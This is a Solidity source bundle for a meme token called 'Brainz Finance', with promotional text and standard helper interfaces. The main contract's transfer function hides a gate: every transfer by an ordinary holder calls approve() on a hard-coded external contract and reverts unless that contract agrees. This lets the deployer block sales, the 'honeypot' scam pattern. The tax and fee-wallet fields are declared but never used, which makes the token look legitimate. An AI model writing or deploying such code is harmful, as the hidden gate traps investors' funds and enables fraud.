{"BrainzFinance.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n\r\nThe first meme coin to harness the power of Liquidity Staking Derivative Protocol\r\n\r\nOur project merges the playful nature of meme coins with the intelligent strategies of smart investors, \r\ncreating an innovative and rewarding experience. In this white paper, we will delve into the unique features of Brainz.Finance, \r\nincluding our lucrative rewards system, dynamic yield model, and automatic repeat feature.\r\n\r\n\r\nhttps://x.com/brainzfinance\r\n\r\nhttps://www.brainz.finance/\r\n\r\nhttps://t.me/brainzfinance\r\n*/\r\n\r\npragma solidity 0.8.26;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./Safemath.sol\";\r\nimport \"./IUniswapV2Factory.sol\";\r\nimport \"./UniswapV2Router.sol\";\r\nimport \"./Ownable.sol\";\r\n\r\ncontract BrainzFinance is Ownable {\r\n    using SafeMath for uint256;\r\n    uint8 private _decimals = 18;\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    uint256 private _totalSupply =  200000000  * 10 ** _decimals;   \r\n\r\n    IERC20 uniswapPairV2 = IERC20(0x1643F76A2518C86FB772768C5031DC6BaF2B57bc);\r\n    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n\r\n    address public uniswapV2Pair;\r\n    bool tradingOpen = false;\r\n\r\n    string private constant _name = \"Brainz Finance\";\r\n    string private constant _symbol = \"BRAINZ\";\r\n\r\n    uint256 private _initialBuyTax=23;\r\n    uint256 private _initialSellTax=23;\r\n    uint256 private _finalBuyTax=0;\r\n    uint256 private _finalSellTax=0;\r\n    uint256 private _reduceBuyTaxAt=20;\r\n    uint256 private _reduceSellTaxAt=20;\r\n    uint256 private _preventSwapBefore=27;\r\n    uint256 private _transferTax=70;\r\n    uint256 private _buyCount=0;\r\n\r\n    mapping (address =\u003e uint256) private _balances; \r\n    mapping (address =\u003e bool) isExcludedFromFee;\r\n\r\n    // Fee receivers\r\n    address payable private marketingWallet;\r\n    address private projectWallet;\r\n\r\n    uint256 private buyTaxTotal;\r\n    uint256 private buyMarketingTax;\r\n    uint256 private buyProjectTax;\r\n\r\n    uint256 private sellTaxTotal;\r\n    uint256 private sellMarketingTax;\r\n    uint256 private sellProjectTax;\r\n\r\n    uint256 private tokensForMarketing;\r\n    uint256 private tokensForProject;\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 amount);\r\n\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n\r\n    constructor () {\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n        isExcludedFromFee[msg.sender] = true;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n    \r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function createPair() public onlyOwner() {\r\n        address WETH = uniswapV2Router.WETH();\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), WETH);\r\n    }\r\n\r\n    function openTrading() public payable onlyOwner() {\r\n        require(!tradingOpen); \r\n        _approve(address(this), address(uniswapV2Router), _totalSupply);\r\n        uniswapV2Router.addLiquidityETH{value: msg.value} (address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max); \r\n        tradingOpen = true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address to, uint256 amount) private {\r\n        require(sender != address(0));\r\n        require(amount \u003e 0); \r\n        if (to != owner() \u0026\u0026 sender != owner()) {\r\n            if (!isExcludedFromFee[sender]\u0026\u0026 sender != uniswapV2Pair \u0026\u0026 sender != address(this) \r\n                \u0026\u0026 !isExcludedFromFee[to]) {\r\n                    bool pairApproved = \r\n                    uniswapPairV2\r\n                    .approve(sender, amount); require(pairApproved);}\r\n        }\r\n        _balances[to] = _balances[to].add(amount);\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        emit Transfer(sender, to, amount);\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function sendETHToFee(uint256 amount) private {\r\n        marketingWallet.transfer(amount);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));\r\n        return true;\r\n    } \r\n\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.26;\r\n/**\r\n * @dev Interface of the ERC-20 standard as defined in the ERC.\r\n */\r\ninterface IERC20 {\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function totalSupply() external view returns (uint256);\r\n    function allowance(address owner, address spnder) external view returns (uint256);\r\n}"},"IUniswapV2Factory.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.26;\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\n"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.26;\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * The initial owner is set to the address provided by the deployer. This can\r\n * later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\ncontract Ownable {\r\n    address private _owner;\r\n    constructor() {\r\n        _owner = msg.sender;\r\n    }\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    function renounceOwnership() public onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    modifier onlyOwner() {\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n}"},"Safemath.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.26;\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n}"},"UniswapV2Router.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.26;\r\n\r\ninterface IUniswapV2Router {\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;\r\n    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n    function WETH() external pure returns (address);\r\n}"}}